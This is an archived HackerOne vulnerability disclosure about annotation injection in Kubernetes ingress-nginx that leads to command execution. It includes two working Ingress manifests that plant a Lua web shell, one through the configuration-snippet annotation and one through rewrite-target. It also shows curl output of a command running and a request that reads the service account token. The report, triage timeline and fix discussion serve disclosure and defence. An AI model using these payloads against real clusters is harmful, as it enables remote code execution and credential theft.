---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/cloud
  - stack/kubernetes
  - stack/nginx
  - vuln/command-injection
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2023-11-24
submitted: 2022-10-10T09:58:57.995Z
bounty_usd: 2500
votes: 57
cve: "CVE-2021-25742", "CVE-2021-25746"
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "suanve"
source: "https://hackerone.com/reports/1728174"
title: "Ingress nginx annotation injection causes arbitrary command execution"
---
# Ingress nginx annotation injection causes arbitrary command execution

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 57 | **Program:** Kubernetes | **Disclosed:** 2023-11-24

- Report: [https://hackerone.com/reports/1728174](https://hackerone.com/reports/1728174)
- CWE: Code Injection | CVE: CVE-2021-25742, CVE-2021-25746
- Submitted: 2022-10-10T09:58:57.995Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Report Submission Form

## Summary:
[add a summary of the vulnerability]
For CVE-2021-25742 and CVE-2021-25746, I found a bypass method, which is fatal to the current measures taken by the team
I can easily bypass restrictions and execute arbitrary commands in the express nginx container.
## Kubernetes Version:
[add Kubernetes version & distribution in which the issue was found]

Server Version: version.Info{Major:"1", Minor:"25", GitVersion:"v1.25.2", GitCommit:"5835544ca568b757a8ecae5c153f317e5736700e", GitTreeState:"clean", BuildDate:"2022-09-21T14:27:13Z", GoVersion:"go1.19.1", Compiler:"gc", Platform:"linux/arm64"}



## Component Version:
[if applicable, add component version the issue was found]
ingress-nginx/controller-v1.4.0
https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml

## Steps To Reproduce:
[add details for how we can reproduce the issue, including relevant cluster setup and configuration]
In the latest version (1.4.0), alias was blacklisted,However, nginx supports lua. I can use other watches to insert any location configuration items.
It is meaningless to simply restrict alias instructions. Your team should start from multiple perspectives.

1. minikube start
2. kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml
3. 

We use nginx. ingress. kubernetes The io/configuration snippet annotation can be found in nginx Insert a new location in conf and execute any command through lua.

```shell
cat > su.yml<<EOF
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
spec:
  rules:
  - host: suanve.susec.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80

EOF

kubectl apply -f su.yml
```

This will cause the nginx configuration to be tampered with. We can execute any command in the corresponding ingress.

```shell
curl -v -H 'Host: suanve.susec.me' -H "cmd: id" 127.0.0.1/suanve/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET /suanve/ HTTP/1.1
> Host: suanve.susec.me
> User-Agent: curl/7.79.1
> Accept: */*
> cmd: id
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 10 Oct 2022 09:58:18 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
uid=101(www-data) gid=82(www-data) groups=82(www-data)
```

* Connection #0 to host 127.0.0.1 left intact

```http
GET /suanve/ HTTP/1.1
Host: suanve.susec.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
cmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
Content-Length: 2



```




## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]
{F1978646}

{F1978648}
  * [attachment / reference]

https://hackerone.com/reports/1378175

https://github.com/kubernetes/ingress-nginx/issues/8503

## Impact

Arbitrary command execution
Get kubernetes credentials

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2022-10-17** @h1_analyst_oliver: Hi @suanve,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@h1_analyst_oliver
- **Report Needs More Info**
- **Report New**
- **2022-10-26** @suanve: hi sir, what is the progress of this report?
- **Report Needs More Info**
- **Report New**
- **2022-11-08** @suanve: Hello, how is the report progressing? I would like to see if it is necessary to study this issue in depth .
- **Report Needs More Info**
- **Report New**
- **2022-11-09** @suanve: I have prepared a video hope it can help u.{F2026221}
- **2022-11-18** @suanve: Hello, how is the report progressing?
- **Report Severity Updated**
- **Report Triaged**
- **2023-01-19** @cjcullen: Hi @suanve,

It looks like your configuration sets 
```
data:
  allow-snippet-annotations: "true"
```
The mitigation for [CVE-2021-25742](https://github.com/kubernetes/ingress-nginx/issues/7837) is to set that configuration to false. Does your report still work in the recommended configuration?
- **2023-01-19** @suanve: But you can replace an annotation `nginx.ingress.kubernetes.io/rewrite-target` and it will not be restricted by `allow-snippet-annotations`. I can still perform configuration injection under the security restrictions you mentioned and execute arbitrary code.
You can reproduce it by following the steps below

kubectl edit configmap -n ingress-nginx ingress-nginx-controller
{F2127801}

poc:
su.yaml:
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/rewrite-target: |
      suanve/ last;
      }
      location suanve/ {
        content_by_lua_block {
          local rsfile = io.popen(ngx.req.get_headers()["cmd"]);
          local rschar = rsfile:read("*all");
          ngx.say(rschar);
        }
      }
      location /fs/{
spec:
  rules:
  - host: k8s.suanve.susec.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80


```
{F2127793}

{F2127794}
- **2023-01-28** @suanve: It's been a long time, has there been any progress on this issue?
- **2023-01-30** @h1_analyst_oliver: Hi @suanve,

Thanks for your patience! The Kubernetes team is still working on this internally, and you will be updated once there is more information to share.

Regards,
@h1_analyst_oliver
- **2023-04-12** @suanve: It's been a long time, has there been any progress on this issue?
- **2023-04-15** @h1_analyst_oliver: Hi @suanve,

Thanks for your patience! The Kubernetes team is still working on this internally, and you will be updated once there is more information to share.

Regards,
@h1_analyst_oliver
- **2023-06-19** @suanve: It's been a long time, has there been any progress on this issue?
- **2023-06-19** @h1_analyst_oliver: Hi @suanve,

We still didn't hear back from Kubernetes team, we will let you know once an update is available.

Regards,
@h1_analyst_oliver
- **2023-07-05** @cjcullen: Thank you for your patience. We are still working with the ingress-nginx team on how they would like to fix this issue.
- **2023-08-05** @h1_analyst_oliver: Hi @suanve,

It seems that this issue is fixed here https://github.com/kubernetes/ingress-nginx/pull/7874, and the fix is included in 1.6.4 and 1.7.0. Can you confirm if the issue is fixed?

Regards,
@h1_analyst_oliver
- **2023-08-09** @suanve: Sorry, I've been busy recently and didn't see the message. I reconfigured the latest version of ingress-nginx (looks like 1.8.1) and configured {F2584246} `allow-snippet-annotations: "false"` as requested by kubernetes staff reply
The command is still executed
{F2584245}
- **2023-08-09** @suanve: As for `https://github.com/kubernetes/ingress-nginx/pull/7874` you said, I don’t think this is a good solution, because the people  deploy ingress-nginx cannot be familiar with all the attack syntax,And annotation-value-word-blocklist is not have value by default.
- **Report Severity Updated**
- **Report Retesting**
- **User Completed Retest**
- **2023-09-27** @cjcullen: Also, please set the `--enable-annotation-validation` when testing on 1.9.0
- **Report Retest Approved**
- **Report Triaged**
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **Report Reopened**
- **Bounty Awarded**
- **2023-10-08** @suanve: Thank you for your reward.
 Please record CVE as suanve. 
Have a good day.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
